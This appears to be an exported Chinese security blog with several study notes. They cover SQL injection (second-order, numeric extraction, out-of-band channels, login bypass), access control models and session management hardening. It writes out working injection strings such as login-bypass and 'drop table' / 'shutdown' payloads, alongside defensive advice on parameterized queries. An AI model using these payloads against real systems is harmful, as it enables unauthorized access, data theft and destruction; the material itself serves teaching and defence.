<p>因为保存在数据库中的用户名是字面量字符串foo’，当应用程序提出访问要求时，数据库即返回这个值；只有在字符串被传送给数据库时才使用配对的转义序列。因此，当应用程序重复使用这个字符串并将它嵌入到另一个查询中时，就会造成一个SQL注入漏洞，用户最初的恶意输入就被嵌入到查询中。当用户尝试修改密码时，应用程序返回以下消息，暴露了上述缺陷：</p>
<p><strong>Unclosed quotation mark before the character string ‘foo</strong></p>
<p>要利用这种漏洞，攻击者值需注册一个包含专门设计的输入用户名，然后尝试修改密码。例如，如果注册如下用户名：</p>
<p><strong>‘ or 1 in (select password from users where username = ‘admin’)–</strong></p>
<p>注册步骤将会被应用程序安全处理。如果攻击者尝试修改密码，他注入的查询就会执行，导致生成以下消息，泄露管理员的密码：</p>
<p><strong>Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07’</strong></p>
<p><strong>Microsoft ODBC SQL Server Driver SQL Server Systax error converting</strong></p>
<p>*<em>the varchar value ‘fme69’ to a column of data type int *</em></p>
<p>攻击者已经成功避开旨在阻止SQL注入攻击的输入确认，现在他能够在数据库中执行任意查询并获得查询结果。</p>
<h2 id="高级利用"><a href="#高级利用" class="headerlink" title="高级利用"></a>高级利用</h2><p>应用程序所有者应该意识到，并非所有攻击都旨在盗窃敏感数据。一些攻击可能更具破坏性，例如，仅仅提交12个字符的输入，攻击者就能够给使用关闭命令（shutdown`）关闭一个MS-SQL数据库。</p>
<p><strong>‘ shutdown–</strong></p>
<p>攻击者还可以注入恶意命令，如下面这些命令可删除一些数据库表：</p>
<p><strong>‘ drop table users–</strong></p>
<p><strong>‘ drop table accounts–</strong></p>
<p><strong>‘ drop table customers–</strong></p>
<h3 id="获取数字数据"><a href="#获取数字数据" class="headerlink" title="获取数字数据"></a>获取数字数据</h3><p>如果包含单引号的输入得到正确处理，那么应用程序中的字符串字段就不易受SQL注入攻击。但是，数字数据字段可能仍可能存在漏洞。在这种字段中，用户输入并不包含在单引号中。这时攻击者只有通过应用程序的数值响应，才能获得注入查询的结果。</p>
<p>在这种情况下，攻击者需要做的是获取数字形式的有用数据，对注入查询的结果进行处理。他们可以使用以下两个关键函数：</p>
<ul>
<li>ASCII，它返回输入字符的ASCII代码；</li>
<li>SUBSTRING（或Oracle中的SUBSTR），它返回输入的子字符串。</li>
</ul>
<p>这些函数可结合在一起使用，以数字形式从一个字符串中提取一个单独字符。例如：</p>
<p><strong>SUBSTRING(‘Admin’, 1, 1)返回A</strong></p>
<p><strong>ASCII(‘A’)返回65</strong></p>
<p>因此</p>
<p><strong>ASCII(SUBSTR(‘Admin’, 1, 1))</strong></p>
<p>使用者两个函数，可以系统地将一个有用数据的字符串分割成单个的字符，并以数字形式分别返回每一个字符。在自定义攻击中，可以利用这种技巧，以一次一个字节的速度，迅速获得并重建大量基于字符串的数据。</p>
<h3 id="使用带外通道"><a href="#使用带外通道" class="headerlink" title="使用带外通道"></a>使用带外通道</h3><p>在许多SQL注入攻击中，应用程序并不在用户的浏览器中显示注入查询的结果，也不返回数据库生成的任何错误消息。很明显，在这种情况下，即使一个SQL注入漏洞确实存在，攻击者也无法对其加以利用，提取任意数据或执行任何其他操作。但是，这种想法是错误的，及时出现这种情况，仍然可以使用各种技巧获取数据、确认其他恶意操作是否取得成功。</p>
<p>许多时候，可以注入一个任意查询，但却无法获得查询结果。回到那个易受攻击的登录表单，它的用户名和密码字段易于遭受SQL注入：</p>
<p><strong>SELECT * FROM  users WHERE username = ‘marcus’ and password = ‘secret’</strong></p>
<p>除了修改查询逻辑以避开登录外，还可以注入一个完全独立的子查询，使用字符串连接符把这个子查询的结果与控制的数据项连接起来。例如：</p>
<p><strong>foo’ || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username=’SBSNMP’) = ‘DBSNMP’)–</strong></p>
<p>应用程序将执行以下查询：</p>
<p><strong>SELECT * FROM users WHERE username = ‘foo’ || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’)</strong></p>
<p>数据库将执行注入的任何子查询，并将它的结果附加在foo之后，然后查找所生成用户名的资料。当然，这种登录不会成功，但会执行注入的查询。在应用程序响应中受到的只是标准的登录失败消息。现在需要想办法获得注入查询的结果。</p>
<p> 如果能对MS-SQL数据库使用批量查询，这时就会出现另一种情形。批量查询特别有用，因为它们允许执行一个完全独立的语句，在这个过程中，渗透测试员拥有全部的控制权，可以使用另外的SQL语句并针对不同的表进行查询。但是，因为批量查询执行查询的方式比较特殊，我们无法直接获得注入查询的执行结果，同样需要想办法获得注入查询的结果。</p>
<p>在这种情况下，一种获取数据的有效方法是使用带外通道。能够在数据库中执行任意SQL语句后，渗透测试员往往可以利用数据库的一些内置功能在护具库与自己的计算机之间建立网络连接，通过它传送从数据库中收集到的任何数据。</p>
<p>建立适当网络连接的方法以不同的数据库而定，而且取决于应用程序访问数据库所使用的的用户权限。</p>
<h2 id="扩大数据库攻击范围"><a href="#扩大数据库攻击范围" class="headerlink" title="扩大数据库攻击范围"></a>扩大数据库攻击范围</h2><p>成功利用一个SQL注入漏洞往往可完全控制应用程序的所有数据。大多数应用程序仅使用一个账户访问数据库，并且依赖应用程序层控制在不同的用户间实施访问隔离。如果能够无限制地使用应用程序的数据库账户，就可以自由访问其中的数据。</p>
<p>因此，可以假设，拥有应用程序的所有数据时SQL注入攻击的最终目的。然而，许多原因表名，利用数据库中的漏洞，或者控制它的一些内置功能以达到目的，从而进一步实施攻击，可能会取得更大的功效。通过扩大数据库攻击范围可实施的其他攻击如下：</p>
<ul>
<li>如果数据库被其他引用程序共享，可以通过提升数据库的使用权限访问其他应用程序的数据。</li>
<li>可以攻破数据库服务器的操作系统。</li>
<li>可以访问其他系统。通常，数据库服务器是一个在基层网络边界防御保护下的网络中的主机。如果能够控制数据库服务器，攻击者就处在一个可信的位置上，可以访问其他主机的关键服务，进一步对其加以利用。</li>
<li>可以在主机基础架构与自己的计算机之间建立网络连接。这样，攻击者就可以完全避开应用程序的防御，轻易传送从数据库收集到的大量敏感数据，并且可穿透许多入侵检测系统。</li>
<li>可以通过创建用户定义的功能任意扩充数据库的现有功能。有些时候，可以通过这种方式重新执行已被删除或禁用的功能，避开数据库实施的强化保护措施，只要已经获得数据库管理员权限，就有办法在每种主流数据库中执行这种操作。</li>
</ul>
<h2 id="防止SQL注入"><a href="#防止SQL注入" class="headerlink" title="防止SQL注入"></a>防止SQL注入</h2><h3 id="部分有效的防御措施"><a href="#部分有效的防御措施" class="headerlink" title="部分有效的防御措施"></a>部分有效的防御措施</h3><p>由于单引号在SQL注入漏洞中占有突出地位，繁育这种攻击的一种常用方法，就是将用户输入的任何单引号配对，对它们进行转义。但是，在下面两种情况下，这种方法无效。</p>
<ul>
<li>如果用户提交的数字数据内置在SQL查询中，这种数据通常并不包含在单引号内。因此，攻击者能够破坏数据的使用环境并开始输入任意SQL查询，这时就不必输入单引号。</li>
<li>在二阶SQL注入攻击中，最初在插入数据库中时已经安全转移的数据随后被从数据库中读取出来，然后又再次写入。当重新使用数据时，最初配对的引号又恢复到单引号形式。</li>
</ul>
<p>另一种常用的应对措施是使用存储过程完成全部数据库访问。无疑，定制的存储过程可增强安全性，提高性能；然而，由于两方面的原因，它们并不能保证防止SQL漏洞：</p>
<ul>
<li>编写存在缺陷的存储过程可能在自身代码中包含SQL注入漏洞。</li>
<li>及时使用安全可靠的存储过程，但如果使用用户提交的输入以不安全的方式调用这个存储过程，也仍然可能出现SQL注入漏洞。</li>
</ul>
<h3 id="参数化查询"><a href="#参数化查询" class="headerlink" title="参数化查询"></a>参数化查询</h3><p>大多数数据库和应用程序开发平台都提供API，对不可信的输入进行安全处理，以防止SQL注入漏洞。参数化查询分两个步骤建立一个包含用户输入的SQL语句。</p>
<ol>
<li>应用程序制定查询结构，为用户输入的每个数据预留字符；</li>
<li>应用程序制定每个占位符的内容；</li>
</ol>
<p>至关重要的是，在第二个步骤中制定的专门设计的数据无法破坏在第一个步骤中制定的查询结构。因为查询结构已经确定，且相关API对所有类型的占位符数据进行安全处理，因此它总被解释为数据，而不是语句结构的一部分。</p>
<p>使用参数化查询可有效防止SQL注入，但还要注意一下几个重要的限制。</p>
<ul>
<li>应在每一个数据库查询中使用参数化查询。</li>
<li>插入查询中的每一种数据都应适当进行参数化。</li>
<li>参数占位符不能用于指定查询中的表和列的名称。</li>
<li>参数占位符不能用于查询的任何其他部分，如Order by子句中的ASC或DESC关键字，或其他任何SQL关键字，因为它们属于查询结构的一部分。</li>
</ul>
<h3 id="深层防御"><a href="#深层防御" class="headerlink" title="深层防御"></a>深层防御</h3><p>通常，一种稳定的安全机制应采用深层防御措施提供额外的保护，以防止前端防御由于任何原因失效。当防御针对后端数据库的攻击时，应采用另外三层防御。</p>
<ul>
<li>当访问数据库时，应用程序应尽可能使用最低权限的账户。</li>
<li>许多企业数据库包含大量默认功能，可被能够执行任意SQL语句的攻击者利用。</li>
<li>应评估、测试并及时安装供应商发布的所有安全补丁，以修复数据库软件本身已知的漏洞。</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>注入解释型语言</title>
    <url>/2019/03/22/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/4-1%E6%B3%A8%E5%85%A5%E8%A7%A3%E9%87%8A%E6%80%A7%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<h1 id="攻击数据存储"><a href="#攻击数据存储" class="headerlink" title="攻击数据存储"></a>攻击数据存储</h1><h1 id="注入解释性语言"><a href="#注入解释性语言" class="headerlink" title="注入解释性语言"></a>注入解释性语言</h1><p>解释性语言（interpreted language）是一种在运行时有一个运行时组件（runtime component）解释语言代码并执行其中包含的指令的语言。与之相对，编译型语言（compiled language）是这样一种语言：它的代码在生成时转换成机器指令，然后在运行时直接由使用该语言的计算机处理器执行这些指令。</p>
<p>从理论上说，任何语言都可使用编译器或解释器来执行，这种区别并不是语言本身的内在特性。但是，大多数语言仅通过上述其中一种方式执行，开发Web应用程序使用的许多核心语言使用解释器执行，包括SQL、LDAP、Perl和PHP。</p>
<p>基于解释型语言的执行方式，产生了一系列叫做代码注入（code injection）的漏洞。任何有实际用途的应用程序都会受到用户提交的数据，对其进行处理并执行相应的操作。因此，由解释器处理的数据实际上是由程序员编写的代码和用户提交的数据共同组成的。有些时候，攻击者可以提交专门设计的输入，通常提交某个在应用程序中使用解释型语言语法的具有特殊意义的句法，向应用程序实施攻击。结果，这个输入的一部分被解释称程序指令执行，好像它们是由最初的程序员编写的代码一样。因此，如果这种攻击取得成功，它将完全攻破目标应用程序的组件。</p>
<p>另一方面，在编译型语言中实施旨在执行任意命令的攻击往往非常困难。这是，注入代码的方法通常并不利用开发目标程序所使用的语言的任何语法特性，注入的有效载荷为机器代码，而不是用哪种语言编写的指令。</p>
<h2 id="避开登录"><a href="#避开登录" class="headerlink" title="避开登录"></a>避开登录</h2><p>无论访问操作是由普通用户还是应用程序管理员触发，应用程序访问数据存储区的过程都大致相同。Web应用程序对数据存储区实施自主访问控制，构造查询基于用户的账户和类型来检索、添加或修改数据存储区中的数据。修改查询（不只是查询中的数据）的成功注入攻击可以避开应用程序的自主访问控制并获取未授权访问。</p>
<p>如果需要安全保护的应用程序逻辑有查询结果控制，攻击者就可以通过修改查询来更改应用程序的逻辑。举一个典型的例子-在后端数据存储区的用户表中查询与用户提供的证书匹配的记录。许多实施基于表单的登录功能的应用程序使用数据库来存储用户证书，并执行简单的SQL查询来确认每次登录尝试。以下是一个典型的示例：</p>
<p><strong>SELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’</strong></p>
<p>这个查询要求数据库检查用户表中的每一行，提取出每条username列值为marcus、password列值为secret的记录。如果应用程序收到一名用户的资料，登录尝试将取得成功，应用程序将为该用户建立一个通过验证的会话。</p>
<p>在这种情况下，攻击者可以注入用户名或者密码字段，以修改应用程序执行的查询，从而破坏它的逻辑。例如，如果攻击者知道应用程序管理员的用户名为admin，那么他就可以通过提交一下用户名和任意密码，以管理员身份登录：</p>
<p><strong>admin’–</strong></p>
<p>应用程序将执行以下查询：</p>
<p><strong>SELECT * FROM users WHERE username=’admin’–’ AND password = ‘foo’</strong></p>
<p>因为其中使用了注释符号（–），上面的查询等同于：</p>
<p><strong>SELECT * FROM users WHERE username = ‘admin’</strong></p>
<p>于是这个查询完全避开了密码检查。</p>
<p>加入攻击者不知道管理员的用户名，该如何实施攻击呢？在大多数应用程序中，数据库的第一个账户为管理账户，因为这个账户通常手工创建，然后再通过它生成其他应用程序账户。而且，如果查询返回几名用户的资料，许多应用程序只会处理第一名的用户。因此，攻击者可利用这种行为，通过提交一下用户名，以数据库中的第一个用户的身份登录：</p>
<p><strong>‘ OR 1 = 1–</strong></p>
<p>应用程序将执行一下查询：</p>
<p><strong>SELECT * FROM users WHERE username = ‘’ OR 1=1– ‘ AND password = ‘foo’</strong></p>
<p>因为其中使用了注释符号，上面的查询等同于：</p>
<p><strong>SELECT * FROM  users WHERE username = ‘’ or 1=1</strong></p>
<p>该查询将返回全部应用程序用户的资料。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>解释性语言</tag>
      </tags>
  </entry>
  <entry>
    <title>攻击数据存储区</title>
    <url>/2019/03/21/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/4.%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E5%8C%BA/</url>
    <content><![CDATA[<h1 id="攻击数据存储"><a href="#攻击数据存储" class="headerlink" title="攻击数据存储"></a>攻击数据存储</h1><p>几乎所有应用程序都依赖数据存储区来管理在应用程序中处理的数据。在许多情况下，这些数据负责处理核心应用程序逻辑、保存用户账户、权限。应用程序配置设置等。现在数据存储区已不再是被动的数据容器。大多数数据存储区都保存有结构化、可以使用预先定义的查询格式或语言访问的数据，并包含内部逻辑来管理这些数据。</p>
<p>通常，应用程序使用常用的权限级别来管理对数据存储区的各种访问操作，以及处理属于不同应用程序用户的数据。如果攻击者能够破坏应用程序与数据存储区的交互，使应用程序检索或修改各种数据，那么，攻击者就可以避开在应用层次对数据访问实施的任何控制。</p>
<ol>
<li><p>注入解释性语言</p>
</li>
<li><p>注入SQL</p>
</li>
<li><p>注入NoSQL</p>
</li>
<li><p>注入XPath</p>
</li>
<li><p>注入LDAP</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>数据存储</tag>
      </tags>
  </entry>
  <entry>
    <title>攻击访问控制</title>
    <url>/2019/03/20/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/3.%E6%94%BB%E5%87%BB%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[<h1 id="攻击访问控制"><a href="#攻击访问控制" class="headerlink" title="攻击访问控制"></a>攻击访问控制</h1><p>访问控制漏洞的概念非常简单：应用程序允许攻击者执行某种攻击者没有资格执行的操作。</p>
<p>访问控制可分为三大类：垂直访问控制、水平访问控制和上下文访问控制。</p>
<p>垂直访问控制允许各种类型的用户访问应用程序的不同功能。在最简单的情况下，应用程序通过这种控制界定普通用户和管理员。在更加复杂的情况下，垂直访问控制可能需要界定允许其访问特殊功能的各种不同类型的用户，给每个用户分配一个单独的角色，或一组不同的角色。</p>
<p>水平访问控制允许用户访问一组相同类型的、内容及其宽泛的的资源。</p>
<p>上下文相关的访问控制可确保基于应用程序当前的状态，将用户权限仅限于所允许的内容。</p>
<p>许多时候，垂直与水平访问控制相互交叠。</p>
<p>如果用户能够访问他无权限访问的功能和资源，就表示访问控制存在缺陷。主要有三种类型的以访问控制为目标的攻击，分别与三种访问控制相对应。</p>
<ul>
<li><p>如果一名用户能够执行某项功能，但分配给他的角色并不具有这种权限，就表示出现<strong>垂直权限提升</strong>漏洞。例如，如果一名普通用户能够执行管理功能，或者一位会计文员能够支付任意金额的发票，就表示访问控制并不完善。</p>
</li>
<li><p>如果一名用户能够查看或修改它没有资格查看或修改的资源，就表示出现<strong>水平权限提升漏洞</strong>。例如，如果用户能够使用Web邮件应用程序阅读他人的电子邮件，或者如果一位会计文员可以处理自己所属组织单元以外的单元的发票，那么访问控制也不完善。</p>
</li>
<li><p>如果用户可以利用应用程序状态机中的漏洞获得关键资源的访问权限，就表示出现<strong>业务逻辑漏洞</strong>。例如，用户能够避开购物结算序列中的支付步骤。</p>
</li>
</ul>
<h2 id="保障访问控制的安全"><a href="#保障访问控制的安全" class="headerlink" title="保障访问控制的安全"></a>保障访问控制的安全</h2><ul>
<li>不要认为不知道用于指定应用程序资源的URL或标识符（如账号和文档ID）就无法访问这些资源。假设用户知道每一个应用程序的URL和标识符，确保应用程序的访问控制足以防止未授权访问。</li>
<li>不要信任任何用户提交的表示访问权限的参数。</li>
<li>不要认为用户将按设定的顺序访问应用程序页面。不要认为因为用户无法访问“编辑用户”页面，它们就不能到达由该页面链接的“编辑用户X”页面。</li>
<li>不要相信用户不会篡改通过客户端传送的数据。</li>
</ul>
<p>以下是一些在Web应用程序中执行有效访问控制的最佳方法。</p>
<ul>
<li>仔细评估并记录每个应用程序功能单元的访问控制要求。这包括谁能合法使用这些功能，以及用户通过这些功能能够访问哪些资源。</li>
<li>通过用户会话做出所有访问控制决定。</li>
<li>使用一个中央应用程序组件检查访问控制。</li>
<li>通过这个组件处理每一个客户端请求，确认允许提出请求的用户访问他请求的功能和资源。</li>
<li>使用编程技巧确保前面的方法没有例外。一种有效的方法是规定每个应用程序页面必须采用一个由中央访问控制机制查询的界面。强制开发者将访问控制逻辑代码写入每个页面，不得找借口省略这些代码。</li>
<li>对于特别敏感的功能，如管理页面，可以通过IP地址进行进一步限制访问，确保只有特殊网络范围内的用户能够访问这些功能，不管他们是否登录。</li>
<li>如果静态内容需要得到保护，有两种方法可提供访问控制。首先，用户可通过向执行相关访问控制逻辑的服务器端动态页面传送一个文件名，间接访问静态文件。其次，可通过使用HTTP验证或应用程序服务器的其他特性隐藏进入的请求，并在允许访问前检查资源许可，控制用户直接访问静态文件。</li>
<li>无论何时通过客户端传送，指定用户所希望访问资源的标识符都容易遭到篡改。服务器应知心人完整的服务器端数据。任何时候通过客户端传送这些标识符，都需要对他们进行重新确认，以确保用户拥有访问被请求资源的授权。</li>
<li>对于安全性很关键的应用程序功能，考虑对每笔交易执行重复验证和双重授权，进一步确保该动能不会被未授权方使用，这样做可以减轻其他可能的攻击造成的后果。</li>
<li>记录每一个访问敏感数据或执行敏感操作的时间。</li>
</ul>
<h2 id="多层权限模型"><a href="#多层权限模型" class="headerlink" title="多层权限模型"></a>多层权限模型</h2><h3 id="编程控制"><a href="#编程控制" class="headerlink" title="编程控制"></a>编程控制</h3><p>数据库权限矩阵保存在一个数据库表中，并以编程的形式来做出访问控制决定。对用户角色进行分类可以简化某些访问控制检查，这一任务同样可以通过编程来完成。编程控制可能极其琐碎，并可能在应用程序中建立非常复杂的访问控制逻辑。</p>
<h3 id="自主访问控制"><a href="#自主访问控制" class="headerlink" title="自主访问控制"></a>自主访问控制</h3><p>自主访问控制（Discretionary Access Control， DAC）。使用自主访问控制，管理员可将自己的权限分配给其他与拥有特殊资源有关的用户。在<strong>封闭型DAC</strong>模型中，除非明确许可，否则拒绝访问。管理员还可以锁定或终止某个用户账户。在<strong>开放型DAC</strong>模型中，除非明确废除许可，否则允许访问。各种应用程序用户有权创建用户账户，并在此应用自主访问控制。</p>
<h3 id="基于角色的访问控制"><a href="#基于角色的访问控制" class="headerlink" title="基于角色的访问控制"></a>基于角色的访问控制</h3><p>基于角色的访问控制（Role-Based Access Control，RBAC）。这种控制使用许多命名的角色，每个角色拥有各不相同的特殊权限；每个用户分配有一个这样的角色。这样做可简化不同权限的分配与实施，并有助于管理复杂应用程序中的访问控制。使用角色对用户请求执行“前沿”访问检查有助于实行最少量的处理迅速拒绝许多未授权的请求。对特殊用户可访问的URL路径加以保护就是这种方法的一个典型应用</p>
<p>当设计基于角色的访问控制机制时，有必要限制角色的数量，以对应用程序的权限进行有效管理。如果建立太多琐碎的角色，那么由于不同角色的数目繁多，可能就很难对其进行有效管理。如果建立太少的角色，这些角色就只能对访问进行粗略管理，个体用户分配到的权限将不足以履行他们的职能。</p>
<p>如果使用平台级控制、基于HTTP方法和URL限制对不同应用程序角色的访问，则应将这些控制设计为使用默认拒绝模式，因为这是防火墙规则的最佳做法。这其中应包括各种特定规则，用于将某些HTTP方法和URL分配给特定角色，而且，随后的规则应拒绝不符合前一规则的任何请求。</p>
<h3 id="声明式控制"><a href="#声明式控制" class="headerlink" title="声明式控制"></a>声明式控制</h3><p>声明式控制（Declarative Control）。应用程序使用有线的数据库账号访问数据库。它对不停的用户群体使用不同的账户，每个账户分配到执行该群体所允许执行的操作所必需的的最低权限。这种声明式控制从应用程序以外进行声明。这是深层防御原理的一个非常有用的应用，因为权限是由另外一个组件赋予应用程序的。这样，即使一名用户突破在应用程序层面执行的访问控制，企图实施添加新用户之类的敏感操作，他仍然会被组织，因为他使用的数据库账号并未在数据库内获得必要的权限。</p>
<p>另一种情况是在配置应用程序的过程中，通过配置描述符文件在应用程序服务器层面上应用声明式访问控制，但是这种应用一般相对简单，并且无法进行扩展，所以无法管理大型应用程序中种类繁多的权限。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>访问控制</tag>
      </tags>
  </entry>
  <entry>
    <title>攻击会话管理</title>
    <url>/2019/03/19/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/2.%E6%94%BB%E5%87%BB%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="攻击会话管理"><a href="#攻击会话管理" class="headerlink" title="攻击会话管理"></a>攻击会话管理</h1><h2 id="会话和Cookie"><a href="#会话和Cookie" class="headerlink" title="会话和Cookie"></a>会话和Cookie</h2><p>HTTP协议没有状态。它基于一种简单的请求-响应模型，其中美队消息代表一个独立的事务。协议本身并无将某位用户提出的各种请求联系起来的机制，并将它们与Web服务器收到的其他所有请求区分开来。</p>
<p>绝大多数的Web“站点”实际为Web应用程序。它们允许用户注册于与登录；帮助用户购买及销售产品。它们能够在用户下次访问时记住他的喜好。它们可根据用户的单机和输入，通过动态建立的内容提供丰富。多媒体形式的使用体验。为执行这些功能，就需要使用<strong>会话</strong>。</p>
<p>会话（Session）机制是在服务器保存状态的方案。执行会话最简单、最常见的方法就是向每名用户发布一个唯一的会话令牌或标识符。用户在随后向应用程序提出的每一个请求中都提交这个令牌，帮助应用程序在当前请求与前面提出的请求之间建立关联。</p>
<p>在大多数情况下，应用程序使用HTTP Cookie最为在服务器与客户端间传送这些会话令牌的传输机制。</p>
<h2 id="会话管理的基本方式"><a href="#会话管理的基本方式" class="headerlink" title="会话管理的基本方式"></a>会话管理的基本方式</h2><p>会话管理的基本方式主要有隐藏域、Cookies和URL重写。</p>
<h3 id="隐藏域"><a href="#隐藏域" class="headerlink" title="隐藏域"></a>隐藏域</h3><p>隐藏域是基于客户端实现的一种方式。比如，在填写信息的时候，完成第一页，进入第二页填写的时候，将第一页的信息保存在隐藏域中，在第二页完成之后，全部一起提交给服务器。这种方式具有不少的安全问题，例如，在关掉网页之后，就会遗失信息；查看网页源代码时，容易暴露信息。</p>
<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>Cookie是存储key-value键值对的一个文件。它是由服务器对客户端的第一个响应中的Set-Cookie消息头指定设置的。例如：</p>
<p><strong>Set-Cookie： id=123</strong></p>
<p>浏览器在请求响应头中检测到Set-Cookie头之后，会自动生成一个Cookie，将id=123保存在本地。</p>
<p>随后客户端每次请求的时候都是用Cookie请求头，将id=123这个值带给服务器，服务器再根据123找到对应的信息来维持状态。</p>
<p><strong>Cookie:id=123</strong></p>
<h3 id="URL重写"><a href="#URL重写" class="headerlink" title="URL重写"></a>URL重写</h3><p>URL重写就是将需要发送给服务器的信息附加在请求链接的背后，以参数的形式发送给服务器识别。</p>
<h2 id="会话的替代方案"><a href="#会话的替代方案" class="headerlink" title="会话的替代方案"></a>会话的替代方案</h2><h3 id="HTTP验证"><a href="#HTTP验证" class="headerlink" title="HTTP验证"></a>HTTP验证</h3><p>使用各种基于HTTP验证技术（基本、摘要、NTLM验证等）的应用程序有时避免使用会话。在HTTP验证中，哭护短组件使用HTTP消息头，通过浏览器直接与验证机制加护，而不是通过包含在任何单独页面中的针对特定应用程序的代码与验证机制交互。一旦用户在浏览器对话框中输入它的证书，浏览器将会在随后向同一服务器提出的每个请求中重复提交这些证书。（或重复执行任何必要的握手）这种做法等同于应用程序使用基于HTML表单的验证，并在每个应用程序页面插入一个登陆表单要求用户通过他们执行的每一项操作重复验证自己的身份。因此，如果使用基于HTTP的验证，应用程序可以不必要使用会话，而通过多个请求重复确定用户身份。然而，基于因特网的应用程序很少使用HTTP验证。而且，由于会话机制发展完善，能够提供其他用途非常广泛的功能，实际上，几乎所有的Web应用程序都采用这种机制。</p>
<h3 id="无会话状态机制"><a href="#无会话状态机制" class="headerlink" title="无会话状态机制"></a>无会话状态机制</h3><p>一些应用程序并不发布会话令牌管理用户与应用程序的交互状态，而是传送所有必要数据（一般保存在Cookie或隐藏表单字段中），由客户端管理状态。实际上，这种机制类似于ASP.NET viewState的方式使用无会话状态。为保证这种机制的安全，必须对通过客户端传送的数据加以适当的保护。这通常要求建立一个包含所有状态信息的二级制巨对象，并使用一种公认的算法对这些数据进行加密或签名。还必须在数据中包含足够的上下文，以防止攻击者将在应用程序某个位置收集到的状态提交到另一个位置，造成某种意外行为。应用程序还必须在对象的数据中包含一个终止时间，执行与会话超时相同的功能。</p>
<h2 id="会话令牌生成过程中的薄弱环节"><a href="#会话令牌生成过程中的薄弱环节" class="headerlink" title="会话令牌生成过程中的薄弱环节"></a>会话令牌生成过程中的薄弱环节</h2><ol>
<li>令牌有一定含义</li>
<li>令牌可预测<ol>
<li>隐含序列</li>
<li>时间依赖</li>
<li>生成的数字随机性不强</li>
</ol>
</li>
</ol>
<h2 id="会话令牌处理中的薄弱环节"><a href="#会话令牌处理中的薄弱环节" class="headerlink" title="会话令牌处理中的薄弱环节"></a>会话令牌处理中的薄弱环节</h2><ol>
<li>在网络中泄露令牌</li>
<li>在日志中泄露令牌</li>
<li>令牌-会话映射易受攻击</li>
<li>会话终止易受攻击</li>
<li>客户端暴露在令牌劫持风险之中</li>
<li>宽泛的Cookie范围</li>
</ol>
<h2 id="保障会话管理的安全"><a href="#保障会话管理的安全" class="headerlink" title="保障会话管理的安全"></a>保障会话管理的安全</h2><h3 id="生成强大的令牌"><a href="#生成强大的令牌" class="headerlink" title="生成强大的令牌"></a>生成强大的令牌</h3><ol>
<li>使用数量及其庞大的一组可能值；</li>
<li>包含强大的伪随机源，确保令牌以无法预测的方式平均分布在可能值的范围内</li>
</ol>
<h3 id="在整个生命周期保障令牌的安全"><a href="#在整个生命周期保障令牌的安全" class="headerlink" title="在整个生命周期保障令牌的安全"></a>在整个生命周期保障令牌的安全</h3><p>建立一个无法预测值的安全令牌后，就必须在这个令牌生成到废止的整个生命周期内保障它的安全，确保不会将其泄露给除令牌用户以外的其他任何人。</p>
<ol>
<li>令牌只能通过HTTPS传送。任何以明文传送的令牌都应被视为“污染”，也就是说，不能确保用户身份不被泄露。如果使用HTTP Cookie传送令牌，应将这些cookie加上<strong>secure</strong>标识（属性），防止用户浏览器通过HTTP传送它们。如果可能，应对每个应用程序页面使用HTTPS，包括静态内容（帮助页面、图像等）。如果没有可能，仍然采用HTTP服务，那么应用程序应将任何访问敏感内容（包括登录页面）的请求重定向到HTTPS服务。帮助页面之类的静态资源一般不属于敏感内容，不需要使用通过验证的会话即可访问；因此，可以通过使用cookie范围指令强化cookie的使用安全。，防止在访问这些资源的请求中提交令牌。</li>
<li>绝不能再URL中传送会话令牌，这样做易于受到会话固定攻击，并可能使会话出现在各种日志机制中。</li>
<li>应总是执行退出功能。通过它删除服务器上的所有会话资源并终止会话令牌。</li>
<li>会话处于非活动状态一段时间后，应执行会话终止。会话终止的效果应和用户完全退出的作用完全相同。</li>
<li>应防止并行登录。</li>
<li>如果应用程序包含任何可以查看会话令牌的管理或诊断功能，应对这种功能加以严密保护，以防止未授权的访问。</li>
<li>应极可能限定应用程序会话cookie的域和路径范围。</li>
<li>应严格审查应用程序的代码库，以确定并删除任何跨站点脚本漏洞。</li>
<li>不应接受用户提交。但服务器并不认可的任意令牌。应立即在浏览器中取消该令牌，并将用户返回到应用程序的起始页面。</li>
<li>在执行装展示类的重要操作之前，要求进行两步确认或重新验证可有效防御跨站点请求伪造和其他会话攻击。</li>
<li>不完全依赖HTTP cookie传送会话令牌可防御跨站点请求伪造攻击。</li>
<li>成功验证后，总是建立一个新的会话，以避免会话固定攻击的影响。</li>
</ol>
<h3 id="日志、监控与警报"><a href="#日志、监控与警报" class="headerlink" title="日志、监控与警报"></a>日志、监控与警报</h3><p>应用程序段额会话管理功能应与它的日志、监控与警报机制紧密结合，以提供适当的反常行为记录，并帮助管理员在必要时采取防御措施。</p>
<ol>
<li>应用程序应监控包含无效令牌的请求。</li>
<li>很难完全阻止针对会话令牌的蛮力攻击，因为我们无法通过禁用特殊用户账户或会话来终止这种攻击。一种可能的防御方法是在收到大量包含无效令牌的请求时，将其来源IP地址屏蔽一段时间。</li>
